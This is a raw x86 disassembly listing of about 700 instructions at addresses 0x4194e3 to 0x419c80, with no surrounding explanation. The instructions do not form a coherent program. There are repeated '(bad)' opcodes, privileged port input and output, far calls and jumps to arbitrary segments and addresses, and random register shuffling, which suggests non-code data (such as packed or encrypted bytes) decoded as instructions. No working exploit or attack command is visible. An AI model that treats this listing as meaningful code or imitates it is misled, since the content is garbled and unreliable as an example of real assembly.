  4194e3:	scas   al,BYTE PTR es:[edi]
  4194e4:	mov    esi,0xcfcb0061
  4194e9:	push   ds
  4194ea:	push   ds
  4194eb:	(bad)  
  4194ec:	out    0xbb,eax
  4194ee:	mov    dl,ah
  4194f0:	adc    edx,DWORD PTR [ecx-0x3bcc0efd]
  4194f6:	popf   
  4194f7:	mov    dl,0xf
  4194f9:	or     BYTE PTR [esi+ebx*2-0x6b],al
  4194fd:	mov    ecx,0xe6cb1c50
  419502:	push   ebp
  419503:	jbe    0x4194bd
  419505:	ja     0x4194f9
  419507:	sbb    bh,cl
  419509:	pop    eax
  41950a:	cmp    al,0xf5
  41950c:	jne    0x41955a
  41950e:	push   ds
  41950f:	lods   eax,DWORD PTR ds:[esi]
  419510:	jae    0x419518
  419512:	add    ch,bh
  419514:	cmc    
  419515:	call   0x57a7:0x7cd016fc
  41951c:	pusha  
  41951d:	xlat   BYTE PTR ds:[ebx]
  41951e:	fcmove st,st(4)
  419520:	mov    al,ds:0xb7e80610
  419525:	retf   
  419526:	jmp    0xdc5da950
  41952b:	cwde   
  41952c:	jo     0x4194ed
  41952e:	je     0x4194d4
  419530:	add    eax,0xe6a55d30
  419535:	sahf   
  419536:	mov    cs,WORD PTR [ecx]
  419538:	or     eax,0xafd6513a
  41953d:	je     0x419521
  41953f:	mov    eax,ds:0xe0251559
  419544:	test   eax,0xeea7a682
  419549:	cs xchg edx,eax
  41954b:	aam    0x57
  41954d:	jle    0x41951d
  41954f:	mov    dl,BYTE PTR [eax+ecx*4+0x3d]
  419553:	mov    WORD PTR [esi+0x23],gs
  419556:	int3   
  419557:	xor    bl,BYTE PTR [ebx+0x1a]
  41955a:	pop    edx
  41955b:	mov    esi,eax
  41955d:	nop
  41955e:	inc    edi
  41955f:	enter  0xd658,0x13
  419563:	jns    0x41957f
  419565:	push   ebp
  419566:	rol    edi,0x35
  419569:	mov    WORD PTR [esi],fs
  41956b:	dec    ebp
  41956c:	shl    ebp,0x61
  41956f:	fxch   st(6)
  419571:	dec    esi
  419572:	shl    BYTE PTR [ebp-0x7224d5ee],0xa7
  419579:	fistp  QWORD PTR [ecx-0x1a]
  41957c:	jl     0x419534
  41957e:	ret    0x5c3c
  419581:	sbb    al,0xbe
  419583:	xchg   esp,eax
  419584:	fldcw  WORD PTR gs:[edi-0x2d6e86c8]
  41958b:	or     DWORD PTR [edi+eiz*1+0x31],esi
  41958f:	stos   BYTE PTR es:[edi],al
  419590:	sub    BYTE PTR [ecx-0x74],al
  419593:	sbb    al,0x92
  419595:	aam    0x9b
  419597:	in     al,0x23
  419599:	fsub   DWORD PTR ds:0xd1946c8a
  41959f:	xchg   esi,eax
  4195a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195a1:	and    BYTE PTR ds:0xf0d1b925,dl
  4195a7:	adc    ch,cl
  4195a9:	scas   eax,DWORD PTR es:[edi]
  4195aa:	add    al,0x1c
  4195ac:	or     al,0xb
  4195ae:	inc    edi
  4195af:	adc    eax,0x5214bb5b
  4195b4:	mov    eax,0xf8423b7a
  4195b9:	sbb    DWORD PTR [ebx+0x4c],edi
  4195bc:	data16 aas 
  4195be:	pop    ebx
  4195bf:	inc    esi
  4195c0:	es and al,0x7d
  4195c3:	(bad)  
  4195c4:	daa    
  4195c5:	jns    0x4195c3
  4195c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195c8:	inc    eax
  4195c9:	cmc    
  4195ca:	adc    al,0x58
  4195cc:	rcl    BYTE PTR [edx-0x79],0xba
  4195d0:	push   0xffffffac
  4195d2:	inc    ebx
  4195d3:	or     al,0x88
  4195d5:	fidivr WORD PTR [eax]
  4195d7:	pusha  
  4195d8:	mov    esi,0x44a629d8
  4195dd:	addr16 push ebp
  4195df:	add    BYTE PTR [ecx+0x44],ah
  4195e2:	push   edx
  4195e3:	icebp  
  4195e4:	add    BYTE PTR [edx+eiz*2+0xfc9201c],bl
  4195eb:	jp     0x4195ef
  4195ed:	xchg   esi,eax
  4195ee:	sbb    dh,bh
  4195f0:	ror    DWORD PTR [edi],1
  4195f2:	loopne 0x4195f9
  4195f4:	xchg   BYTE PTR [esi-0x71],ah
  4195f7:	call   0x3e44:0x17f464bb
  4195fe:	(bad)  
  419600:	sahf   
  419601:	mov    bl,cl
  419603:	xor    dh,cl
  419605:	push   cs
  419606:	ret    0x8dc3
  419609:	and    DWORD PTR [esp+ebx*4-0x34b49b0],ebp
  419610:	adc    DWORD PTR [ebx+0x6d],ecx
  419613:	dec    eax
  419614:	jmp    0xbc41:0x68e4ec90
  41961b:	sahf   
  41961c:	push   es
  41961d:	retf   0xdf74
  419620:	iret   
  419621:	push   edx
  419622:	in     al,dx
  419623:	mov    dl,0xf8
  419625:	dec    esp
  419626:	in     al,dx
  419627:	add    ebx,DWORD PTR [ebx+0x6df8b828]
  41962d:	add    DWORD PTR [esi+0x3f],0xd2544489
  419634:	jnp    0x41968d
  419636:	xor    al,0x77
  419638:	cmp    al,0x4c
  41963a:	cli    
  41963b:	xchg   edi,eax
  41963c:	push   cs
  41963d:	push   0xb14af476
  419642:	mov    al,ds:0x83d3cd4c
  419647:	mov    eax,ds:0xbc0f0d19
  41964c:	mov    ecx,0xa2006e2e
  419651:	mov    dl,0xbb
  419653:	out    0x6e,eax
  419655:	or     al,0x86
  419657:	cmp    cl,BYTE PTR [eax-0x6dfa78e3]
  41965d:	aam    0x1f
  41965f:	stos   BYTE PTR es:[edi],al
  419660:	and    eax,0xd66baf96
  419665:	sbb    esi,eax
  419667:	out    dx,eax
  419668:	push   ecx
  419669:	dec    eax
  41966a:	outs   dx,BYTE PTR ds:[esi]
  41966b:	push   0xd105f300
  419670:	pop    edx
  419671:	enter  0xb700,0x5a
  419675:	xchg   ecx,eax
  419676:	push   0x37d2863b
  41967b:	sar    BYTE PTR [esi+0x19b1da86],cl
  419681:	push   ecx
  419682:	xor    al,0xd1
  419684:	pop    es
  419685:	pop    eax
  419686:	jp     0x4196fa
  419688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41968a:	sbb    esi,DWORD PTR [esi]
  41968c:	jge    0x41960f
  41968e:	push   0x1f7dc814
  419693:	add    bh,BYTE PTR [esi-0x1cf35b01]
  419699:	js     0x4196df
  41969b:	out    dx,eax
  41969c:	jno    0x4196ab
  41969e:	test   BYTE PTR [eax+0x331d1530],bl
  4196a4:	sbb    BYTE PTR [ebx],dh
  4196a6:	mov    ah,0x4d
  4196a8:	fist   DWORD PTR [eax+0x26]
  4196ab:	(bad)  
  4196ac:	pusha  
  4196ad:	mov    ah,0x19
  4196af:	iret   
  4196b0:	add    BYTE PTR [edx],ah
  4196b2:	in     al,dx
  4196b3:	outs   dx,BYTE PTR ds:[esi]
  4196b4:	pop    ebx
  4196b5:	fsub   DWORD PTR [eax-0x6d510b27]
  4196bb:	mov    eax,ds:0x4f6e3bb6
  4196c0:	sbb    bl,BYTE PTR [esi-0x53]
  4196c3:	lds    esi,FWORD PTR [ebx+edi*4+0x18]
  4196c7:	jb     0x41965c
  4196c9:	(bad)  
  4196ca:	fist   WORD PTR [edx+0x35]
  4196cd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196cf:	mov    dh,0x39
  4196d1:	stc    
  4196d2:	mov    ah,0x17
  4196d4:	cmp    eax,0xa277f9e3
  4196d9:	(bad)  
  4196da:	stos   DWORD PTR es:[edi],eax
  4196db:	lods   eax,DWORD PTR ds:[esi]
  4196dc:	or     ah,cl
  4196de:	jbe    0x4196b8
  4196e0:	rcl    BYTE PTR [edx+eiz*1],1
  4196e3:	xor    edx,eax
  4196e5:	jmp    FWORD PTR [edi]
  4196e7:	scas   eax,DWORD PTR es:[edi]
  4196e8:	out    dx,eax
  4196e9:	sbb    bh,BYTE PTR [esi]
  4196eb:	inc    eax
  4196ec:	loope  0x419681
  4196ee:	data16 test BYTE PTR [esi],0x94
  4196f2:	mov    WORD PTR [ecx-0x24],?
  4196f5:	mov    ebx,0x52f3008
  4196fa:	stos   BYTE PTR es:[edi],al
  4196fb:	into   
  4196fc:	xchg   DWORD PTR [edx+0x34],ebx
  4196ff:	jmp    0x57b383d7
  419704:	ins    BYTE PTR es:[edi],dx
  419705:	in     al,dx
  419706:	or     al,0x34
  419708:	pusha  
  419709:	sbb    DWORD PTR [edi],0x29
  41970c:	jl     0x41976a
  41970e:	out    dx,al
  41970f:	mov    ds:0xfd90eccd,al
  419714:	daa    
  419715:	add    BYTE PTR [ebx-0x44],0x2a
  419719:	pushf  
  41971a:	jecxz  0x4196b8
  41971c:	stos   DWORD PTR es:[edi],eax
  41971d:	push   eax
  41971e:	inc    eax
  41971f:	pop    ds
  419720:	das    
  419721:	or     ebx,0x28
  419724:	retf   0xd750
  419727:	or     DWORD PTR [ebx+0x7f],edi
  41972a:	lods   eax,DWORD PTR ds:[esi]
  41972b:	cmp    al,0x85
  41972d:	push   0x86ac543e
  419732:	ins    BYTE PTR es:[edi],dx
  419733:	(bad)  
  419736:	imul   esi,DWORD PTR [edi+0x2b],0xffffff90
  41973a:	loop   0x4196f4
  41973c:	push   0x5a
  41973e:	gs clc 
  419740:	adc    DWORD PTR [ebp-0x4522c7b9],esi
  419746:	add    al,0x42
  419748:	add    al,0x5f
  41974a:	mov    eax,ds:0x633a09ec
  41974f:	push   cs
  419750:	fs xchg esp,eax
  419752:	sub    ch,cl
  419754:	inc    esi
  419755:	mov    edx,0x69fdfa16
  41975a:	push   0x6f
  41975c:	xchg   ebp,eax
  41975d:	fcmovnb st,st(1)
  41975f:	call   0xa36a99fb
  419764:	and    BYTE PTR [ecx+eax*4-0x40],bl
  419768:	mov    ds:0x80820072,al
  41976d:	push   0x2a
  41976f:	inc    ecx
  419770:	xor    esp,DWORD PTR [eax+edx*8]
  419773:	dec    ecx
  419774:	fimul  DWORD PTR [ecx]
  419776:	push   esp
  419777:	inc    edx
  419778:	mov    ch,BYTE PTR [edi-0x56fb927e]
  41977e:	xlat   BYTE PTR ds:[ebx]
  41977f:	mov    esi,esi
  419781:	jp     0x41973a
  419783:	call   0x2b76:0xc2059ae2
  41978a:	lods   eax,DWORD PTR ds:[esi]
  41978b:	xor    cl,cl
  41978d:	mov    al,cl
  41978f:	inc    edx
  419790:	push   eax
  419791:	push   es
  419792:	stos   BYTE PTR es:[edi],al
  419793:	and    BYTE PTR [edi-0x6c],0x49
  419797:	jmp    DWORD PTR [edi+ebx*4-0x7e6e1a25]
  41979e:	inc    ebp
  41979f:	xor    DWORD PTR [ebx+0x2b],0x4f
  4197a3:	arpl   WORD PTR [edx+0x7910050f],dx
  4197a9:	pop    edx
  4197aa:	and    BYTE PTR [edx-0x4c],0x23
  4197ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197af:	xchg   ebx,eax
  4197b0:	inc    ecx
  4197b1:	xor    DWORD PTR [eax],eax
  4197b3:	sub    BYTE PTR ds:0x72e4bcd,bh
  4197b9:	xlat   BYTE PTR ds:[ebx]
  4197ba:	xor    eax,0x89eb5038
  4197bf:	cmp    BYTE PTR [ecx-0x5c],ch
  4197c2:	mov    dh,0xc5
  4197c4:	icebp  
  4197c5:	mov    fs,WORD PTR [ecx]
  4197c7:	std    
  4197c8:	les    eax,FWORD PTR [bp-0x69f0]
  4197cd:	mov    ds:0xd2e8ad6c,eax
  4197d2:	push   ss
  4197d3:	sub    bl,BYTE PTR [ebx+0x69aa0bc8]
  4197d9:	pop    ecx
  4197da:	sbb    BYTE PTR [ebp+ebx*1+0x63],bh
  4197de:	pop    edx
  4197df:	pop    ecx
  4197e0:	pop    ebx
  4197e1:	ins    DWORD PTR es:[edi],dx
  4197e2:	push   ecx
  4197e3:	aam    0x24
  4197e5:	xorps  xmm2,xmm5
  4197e8:	loop   0x419831
  4197ea:	pop    ebx
  4197eb:	mov    dh,0x89
  4197ed:	jbe    0x41981b
  4197ef:	ja     0x4197d9
  4197f1:	cmp    DWORD PTR [ebx+0x66928fe0],ebx
  4197f7:	int    0x7d
  4197f9:	lock add eax,0x9bbb22b4
  4197ff:	adc    eax,0x83c02a69
  419804:	mov    cl,0xed
  419806:	dec    eax
  419807:	call   0x85c1a682
  41980c:	dec    eax
  41980d:	add    ecx,DWORD PTR [edi-0x62]
  419810:	xchg   ebx,eax
  419811:	push   esp
  419812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419813:	out    dx,eax
  419814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419815:	push   ds
  419816:	mov    ebx,0x5d983995
  41981b:	jbe    0x4197a5
  41981d:	dec    esp
  41981e:	or     al,0x6b
  419820:	mov    ch,0xc0
  419822:	mov    edx,0x7aa284ed
  419827:	jo     0x4197c2
  419829:	xchg   ecx,eax
  41982a:	mov    edx,esi
  41982c:	rcr    BYTE PTR [eax+ecx*8],1
  41982f:	jmp    0x1186c312
  419834:	jmp    0xdfec:0xd0926ca5
  41983b:	cdq    
  41983c:	arpl   ax,bp
  41983e:	stos   DWORD PTR es:[edi],eax
  41983f:	loopne 0x4197da
  419841:	cmp    DWORD PTR [ebp+0xfc01e69],0x1a
  419848:	bound  edx,QWORD PTR [ecx-0x78]
  41984b:	pop    es
  41984c:	mov    bh,0xd3
  41984e:	xchg   BYTE PTR [eax],dl
  419850:	pop    ecx
  419851:	mov    al,0xb1
  419853:	mov    eax,DWORD PTR [edi-0x550357b1]
  419859:	sti    
  41985a:	xchg   esi,eax
  41985b:	ret    0xb7e3
  41985e:	mov    esi,0x38198711
  419863:	xchg   ebx,eax
  419864:	sbb    al,0x12
  419866:	mov    ebp,0x6ecb7ec5
  41986b:	scas   al,BYTE PTR es:[edi]
  41986c:	repz enter 0x2a75,0x2f
  419871:	iret   
  419872:	mov    WORD PTR [eax+0x56],es
  419875:	mov    ebp,0xb704ab35
  41987a:	cmp    eax,esi
  41987c:	mov    dh,0xac
  41987e:	pop    ds
  41987f:	and    ah,cl
  419881:	data16 or BYTE PTR [eax],ch
  419884:	repnz or DWORD PTR [esi],edx
  419887:	xchg   DWORD PTR [ebx-0x6bab2549],edx
  41988d:	mov    ch,0x6c
  41988f:	jge    0x419843
  419891:	push   cs
  419892:	add    ah,bl
  419894:	mov    ah,0xcd
  419896:	jecxz  0x419870
  419898:	stos   DWORD PTR es:[edi],eax
  419899:	xor    ah,bl
  41989b:	aam    0x9d
  41989d:	mov    dh,0x6c
  41989f:	pop    ebx
  4198a0:	dec    ebx
  4198a1:	xor    DWORD PTR [esi],0x31
  4198a4:	push   cs
  4198a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198a6:	jmp    0x90e2e01c
  4198ab:	retf   
  4198ac:	inc    esp
  4198ad:	retf   0x47d6
  4198b0:	sti    
  4198b1:	xchg   ebx,eax
  4198b2:	mov    ebx,0xc68e4519
  4198b7:	int3   
  4198b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198b9:	jae    0x419840
  4198bb:	mov    ebx,0x83bd566c
  4198c0:	(bad)  
  4198c1:	mov    BYTE PTR [ecx-0x5df66d01],ah
  4198c7:	or     BYTE PTR [esi+0x18559c34],cl
  4198cd:	jns    0x4198d9
  4198cf:	mov    ah,0x3a
  4198d1:	mov    esi,0x4fa9faa1
  4198d6:	pusha  
  4198d7:	mov    eax,ds:0x87044830
  4198dc:	or     eax,0xf17b015c
  4198e1:	sahf   
  4198e2:	je     0x419955
  4198e4:	arpl   WORD PTR [ebp+0x68bbe125],sp
  4198ea:	push   eax
  4198eb:	mov    DWORD PTR [edi],esi
  4198ed:	push   cs
  4198ee:	adc    al,0x81
  4198f0:	push   ss
  4198f1:	inc    ebx
  4198f2:	loop   0x4198f8
  4198f4:	xchg   ebx,eax
  4198f5:	cli    
  4198f6:	push   esi
  4198f7:	(bad)  
  4198f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198f9:	xor    al,cl
  4198fb:	sar    dl,0x4f
  4198fe:	jno    0x419953
  419900:	push   ebp
  419901:	xor    eax,0xe1d51658
  419906:	inc    edi
  419907:	mov    ecx,0x9b1eede7
  41990c:	sti    
  41990d:	jmp    0x4ca3cac1
  419912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419913:	inc    eax
  419914:	jae    0x4198c9
  419916:	imul   esi,DWORD PTR [ecx-0x1fab9569],0xc2515eeb
  419920:	js     0x419929
  419922:	aad    0x17
  419924:	sbb    BYTE PTR [edi+esi*4-0x1759f75b],dh
  41992b:	stc    
  41992c:	es jg  0x4198fc
  41992f:	push   ebx
  419930:	adc    DWORD PTR [edx+0x35],esi
  419933:	mov    ds:0x7cb282d2,al
  419938:	scas   eax,DWORD PTR es:[edi]
  419939:	jle    0x419962
  41993b:	xchg   DWORD PTR [ecx-0xf],ecx
  41993e:	inc    DWORD PTR [ecx+0x19a1b5e8]
  419944:	out    0x7d,eax
  419946:	arpl   cx,di
  419948:	lock jb 0x41991e
  41994b:	xchg   edx,eax
  41994c:	dec    esp
  41994d:	cwde   
  41994e:	or     DWORD PTR [eax-0x51022feb],eax
  419954:	push   edx
  419955:	cmovae esp,ebp
  419958:	or     al,0xd5
  41995a:	hlt    
  41995b:	cmp    DWORD PTR [edx-0x6a],ebp
  41995e:	adc    al,0x40
  419960:	adc    BYTE PTR [ebx-0x3173fd11],al
  419966:	mov    edi,0x80d31b17
  41996b:	jecxz  0x41993c
  41996d:	loop   0x4199a1
  41996f:	gs mov ch,0xcf
  419972:	jno    0x4199db
  419974:	sbb    DWORD PTR [ebx],eax
  419976:	dec    esp
  419977:	fisttp WORD PTR ds:0x7d3904d
  41997d:	movups xmm0,XMMWORD PTR [ebx+0x21153deb]
  419984:	xor    eax,0x4afdbe
  419989:	outs   dx,BYTE PTR ds:[esi]
  41998a:	pop    ebx
  41998b:	pop    eax
  41998c:	loopne 0x41999d
  41998e:	lahf   
  41998f:	push   ebx
  419990:	xchg   edi,eax
  419991:	neg    BYTE PTR [edi+edx*4]
  419994:	out    dx,al
  419995:	add    dh,ch
  419997:	leave  
  419998:	xchg   edi,eax
  419999:	in     eax,dx
  41999a:	inc    edi
  41999b:	dec    esp
  41999c:	or     al,bh
  41999e:	fist   DWORD PTR [ecx+0x35]
  4199a1:	fbld   TBYTE PTR [ebx]
  4199a3:	push   eax
  4199a4:	sbb    BYTE PTR [ebp+ecx*4-0x43ca1a7],0xfd
  4199ac:	in     eax,0x47
  4199ae:	jge    0x419936
  4199b0:	mov    ecx,0x5f72becc
  4199b5:	fcom   st(7)
  4199b7:	mov    dl,0x5c
  4199b9:	adc    dl,0xd1
  4199bc:	pop    ss
  4199bd:	(bad)  
  4199be:	cs ds pop es
  4199c1:	pop    ds
  4199c2:	(bad)  
  4199c3:	sub    edi,ebp
  4199c5:	sub    dh,BYTE PTR [ebx+0x53]
  4199c8:	push   edx
  4199c9:	stos   DWORD PTR es:[edi],eax
  4199ca:	push   ecx
  4199cb:	pop    es
  4199cc:	fstp   QWORD PTR [edx+0x64]
  4199cf:	push   ebx
  4199d0:	vprotd ymm3,xmm6,0x18
  4199d5:	adc    al,0xb0
  4199d7:	scas   al,BYTE PTR es:[edi]
  4199d8:	setl   BYTE PTR [esi-0x49]
  4199dc:	arpl   WORD PTR [ebx+0x7c6e73e0],bx
  4199e2:	jnp    0x419a2b
  4199e4:	nop
  4199e5:	inc    eax
  4199e6:	inc    edx
  4199e7:	imul   ebx,DWORD PTR [ecx-0x11],0xa476fb04
  4199ee:	pop    esi
  4199ef:	mov    WORD PTR [ecx-0x13f0433b],es
  4199f5:	sbb    BYTE PTR [eax-0x33],al
  4199f8:	fstp   DWORD PTR [eax+0x77cb5b4]
  4199ff:	xchg   DWORD PTR [ebp-0x76],ebp
  419a02:	lahf   
  419a03:	adc    BYTE PTR [ebp+0x19b2946e],ah
  419a09:	jne    0x419a07
  419a0b:	mov    bh,ch
  419a0d:	enter  0x71fd,0x6f
  419a11:	ror    BYTE PTR [edi+0x4acd7ab4],1
  419a17:	retf   
  419a18:	pop    ds
  419a19:	aaa    
  419a1a:	(bad)  
  419a1b:	outs   dx,BYTE PTR ds:[esi]
  419a1c:	sub    DWORD PTR [ebx-0x4f],ecx
  419a1f:	and    DWORD PTR ss:[ebx+0x69],0xd1148cc1
  419a27:	sbb    ah,BYTE PTR [ebx]
  419a29:	scas   al,BYTE PTR es:[edi]
  419a2a:	mov    bh,BYTE PTR [edi-0x75]
  419a2d:	mov    eax,0xf2f264d9
  419a32:	fdivr  DWORD PTR ds:0x70d95e71
  419a38:	scas   eax,DWORD PTR es:[di]
  419a3a:	sete   BYTE PTR [ecx+0x55]
  419a3e:	pop    ss
  419a3f:	mov    esp,0x68af167d
  419a44:	pushf  
  419a45:	rcl    ch,1
  419a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a48:	fisub  WORD PTR [ebx+ebx*1]
  419a4b:	scas   al,BYTE PTR es:[edi]
  419a4c:	xchg   ebx,eax
  419a4d:	and    DWORD PTR [edi],eax
  419a4f:	hlt    
  419a50:	add    ecx,ebp
  419a52:	es mov ch,0xc1
  419a55:	jp     0x419a55
  419a57:	push   ds
  419a58:	aas    
  419a59:	inc    edx
  419a5a:	retf   
  419a5b:	popa   
  419a5c:	pusha  
  419a5d:	gs (bad) 
  419a5f:	jge    0x419a7a
  419a61:	xchg   BYTE PTR [ecx-0x392052c0],al
  419a67:	jo     0x419aba
  419a69:	inc    edx
  419a6a:	rcl    BYTE PTR [eax],cl
  419a6c:	sbb    esi,DWORD PTR [ebp-0x75340a06]
  419a72:	(bad)  
  419a73:	pop    eax
  419a74:	mov    cl,0x44
  419a76:	pop    edx
  419a77:	push   esp
  419a78:	call   0x5228:0x945240c0
  419a7f:	mov    eax,ds:0x73589219
  419a84:	sti    
  419a85:	sub    al,0xca
  419a87:	xor    al,0xa5
  419a89:	sar    DWORD PTR [esi+0x1bf0bcd0],cl
  419a8f:	xchg   esp,eax
  419a90:	aam    0xa8
  419a92:	or     BYTE PTR [ecx+0x358365ae],0x8b
  419a99:	(bad)  
  419a9a:	mov    dl,0xc
  419a9c:	push   esi
  419a9d:	and    al,0x5e
  419a9f:	mov    ch,0x4
  419aa1:	add    DWORD PTR [ecx+0x69223e5c],ebp
  419aa7:	pop    eax
  419aa8:	push   0x52
  419aaa:	iret   
  419aab:	and    eax,0x44e8eaa1
  419ab0:	je     0x419b01
  419ab2:	lea    edx,[esi]
  419ab4:	test   eax,0xe9c17994
  419ab9:	das    
  419aba:	mov    DWORD PTR [eax],ebp
  419abc:	inc    ecx
  419abd:	sub    ebp,DWORD PTR [bp+si-0x12cd]
  419ac2:	or     eax,0xd48e66f0
  419ac7:	icebp  
  419ac8:	mov    es,WORD PTR [edx]
  419aca:	mov    WORD PTR [eax-0x1c8ce026],ds
  419ad0:	out    0x16,eax
  419ad2:	push   es
  419ad3:	mov    edx,0x624e0f8
  419ad8:	addr16 mov ch,0xa2
  419adb:	sub    BYTE PTR [edi],ch
  419add:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ade:	adc    BYTE PTR [edi],bh
  419ae0:	pushf  
  419ae1:	push   es
  419ae2:	pop    ecx
  419ae3:	xacquire xchg DWORD PTR [esi+0x6f5d8b92],ebp
  419aea:	inc    eax
  419aeb:	(bad)  
  419aec:	repnz cmp DWORD PTR [di-0x6c],0x73
  419af2:	mov    al,0xec
  419af4:	fnsave [ebx-0x7f]
  419af7:	call   0x9700:0xc7781008
  419afe:	lahf   
  419aff:	ins    BYTE PTR es:[edi],dx
  419b00:	push   DWORD PTR [eax-0x35a3dee6]
  419b06:	adc    eax,0xd6ab6f25
  419b0b:	pop    ebp
  419b0c:	or     al,0xc8
  419b0e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b10:	mov    ebp,DWORD PTR [ebp+0x2e]
  419b13:	mov    edx,0x81aa4b12
  419b18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b19:	add    al,0x3a
  419b1b:	and    al,0x8a
  419b1d:	jbe    0x419ad4
  419b1f:	push   ebx
  419b20:	test   eax,0xbd628c97
  419b25:	fmul   DWORD PTR [ebx]
  419b27:	mov    eax,0x346ecb91
  419b2c:	inc    ebx
  419b2d:	and    bl,BYTE PTR gs:[eax]
  419b30:	call   0xe0d38ad2
  419b35:	lods   eax,DWORD PTR ds:[esi]
  419b36:	dec    esp
  419b37:	sahf   
  419b38:	mov    ah,dl
  419b3a:	jge    0x419b77
  419b3c:	sbb    ebp,DWORD PTR [edi-0x45]
  419b3f:	out    dx,al
  419b40:	loopne 0x419b09
  419b42:	mov    cl,0x82
  419b44:	pop    ds
  419b45:	gs dec ecx
  419b47:	stc    
  419b48:	rol    al,cl
  419b4a:	out    0xb4,eax
  419b4c:	imul   ebp,DWORD PTR [ebp+0x76],0xfffffff2
  419b50:	push   eax
  419b51:	sbb    edi,DWORD PTR [ecx+0x72b44244]
  419b57:	test   al,0x91
  419b59:	ret    0xae88
  419b5c:	arpl   WORD PTR gs:[edx+0x14],bx
  419b60:	fdivr  DWORD PTR [edx+0x2369ff3d]
  419b66:	push   edx
  419b67:	ins    BYTE PTR es:[edi],dx
  419b68:	ins    DWORD PTR es:[edi],dx
  419b69:	out    dx,al
  419b6a:	cmc    
  419b6b:	cdq    
  419b6c:	pop    eax
  419b6d:	or     bl,BYTE PTR ds:0xb4fb717c
  419b73:	int    0xd7
  419b75:	dec    eax
  419b76:	rcl    DWORD PTR [ebp-0x688b3484],1
  419b7c:	jae    0x419b53
  419b7e:	push   esi
  419b7f:	out    0x1c,al
  419b81:	test   DWORD PTR [eax+0x77],ebx
  419b84:	call   0xce5b7f32
  419b89:	fdivr  DWORD PTR [ebx]
  419b8b:	sub    eax,0xd3edbff7
  419b90:	imul   ebx,DWORD PTR ds:0xfb6fc10f,0xbff5072c
  419b9a:	sbb    al,0x64
  419b9c:	daa    
  419b9d:	or     BYTE PTR [esi+ecx*8],dh
  419ba0:	dec    eax
  419ba1:	mov    bh,BYTE PTR [ebp-0x2e]
  419ba4:	mov    dh,BYTE PTR [esi-0x69]
  419ba7:	mov    ecx,0xc78c0960
  419bac:	dec    esi
  419bad:	inc    esi
  419bae:	inc    eax
  419baf:	sbb    BYTE PTR [esi],bl
  419bb1:	enter  0x2724,0xcf
  419bb5:	ja     0x419c2b
  419bb7:	in     al,dx
  419bb8:	sub    eax,0xd3908483
  419bbd:	add    eax,0xc14d4e0a
  419bc2:	dec    edi
  419bc3:	dec    edi
  419bc4:	mov    cl,BYTE PTR [esi-0x7f647736]
  419bca:	xor    BYTE PTR [ebp+0x7b],bl
  419bcd:	add    al,0xde
  419bcf:	retf   
  419bd0:	cs loopne 0x419b70
  419bd3:	xchg   esp,eax
  419bd4:	fsubrp st(7),st
  419bd6:	sub    esp,DWORD PTR ds:0xb5b53ee8
  419bdc:	mov    edi,DWORD PTR [ebx]
  419bde:	out    dx,al
  419bdf:	ja     0x419c0f
  419be1:	pop    edi
  419be2:	ret    
  419be3:	jmp    0x419bf2
  419be5:	out    dx,eax
  419be6:	pushf  
  419be7:	div    bh
  419be9:	pop    ds
  419bea:	xor    DWORD PTR [ecx],0xffffffe3
  419bed:	jnp    0x419bc4
  419bef:	loopne 0x419b73
  419bf1:	mov    esi,0xff1a3b54
  419bf6:	(bad)  
  419bf7:	jmp    0x970329f7
  419bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bfd:	jecxz  0x419c1b
  419bff:	jecxz  0x419c63
  419c01:	and    ah,cl
  419c03:	jne    0x419bb5
  419c05:	mov    ebx,0xf05d578e
  419c0a:	pop    eax
  419c0b:	or     BYTE PTR [ebx-0x1fb3611f],bl
  419c11:	test   DWORD PTR [ecx],0xc32b97ae
  419c17:	adc    al,0xb9
  419c19:	mov    ds:0x417fefe9,eax
  419c1e:	ins    BYTE PTR es:[edi],dx
  419c1f:	loopne 0x419ba2
  419c21:	xchg   ebp,eax
  419c22:	daa    
  419c23:	aad    0xb6
  419c25:	pop    esi
  419c26:	fisub  WORD PTR [eax]
  419c28:	jbe    0x419c28
  419c2a:	sbb    esi,DWORD PTR [esi+0x5f]
  419c2d:	mov    gs,WORD PTR [ebx-0x38]
  419c30:	mov    esi,0xe07fd0ae
  419c35:	lea    ecx,[esi+esi*8+0x6a]
  419c39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c3a:	mov    ds,WORD PTR [ecx-0x5e]
  419c3d:	inc    ecx
  419c3e:	push   ebp
  419c3f:	push   ss
  419c40:	inc    edi
  419c41:	(bad)  [ebx-0x268a3564]
  419c47:	pushf  
  419c48:	fidivr DWORD PTR [ecx]
  419c4a:	xor    edi,DWORD PTR [esi]
  419c4c:	fadd   st,st(4)
  419c4e:	rcr    BYTE PTR [edx-0x79],1
  419c51:	sar    BYTE PTR [edi+0x3c81ab0],0xf4
  419c58:	das    
  419c59:	clc    
  419c5a:	sbb    eax,0x6901e1f6
  419c5f:	inc    esp
  419c60:	aas    
  419c61:	mov    DWORD PTR [eax],eax
  419c63:	sti    
  419c64:	stos   BYTE PTR es:[edi],al
  419c65:	add    dl,bl
  419c67:	and    bl,BYTE PTR [ecx+eiz*8-0x42]
  419c6b:	mov    ecx,0xc056266f
  419c70:	ins    DWORD PTR es:[edi],dx
  419c71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c72:	mov    dh,0xd0
  419c74:	xor    eax,0xedd92893
  419c79:	sub    dh,BYTE PTR [ecx+eax*8-0x73]
  419c7d:	outs   dx,BYTE PTR ds:[esi]
  419c7e:	shl    DWORD PTR [edi],1
  419c80:	std    
